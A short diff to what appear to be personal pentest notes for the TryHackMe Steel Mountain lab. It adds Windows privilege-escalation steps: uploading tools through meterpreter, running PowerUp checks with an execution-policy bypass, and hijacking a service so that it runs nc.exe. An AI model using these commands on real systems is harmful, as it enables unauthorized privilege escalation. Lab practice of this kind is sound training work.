@@ -83,12 +83,18 @@ cat /tmp/output
 --- https://tryhackme.com/room/steelmountain
 
 * use meterpreter upload to upload the winPEAS
+* `upload /tmp/xxx`
 * `shell`
 * `.\winPEASany_ofs.exe`
 * `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
 * `powershell -ep bypass -c ". .\PowerUp.ps1;"`
 * `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
+* `load powershell`
 * `powershell_shell`
+* `. .\PowerUp.ps1; Invoke-AllChecks`
 * `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
 * https://www.joesandbox.com/#windows
 * https://github.com/EgeBalci/sgn
+* sc stop XXX
+* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
+* sc start XXX
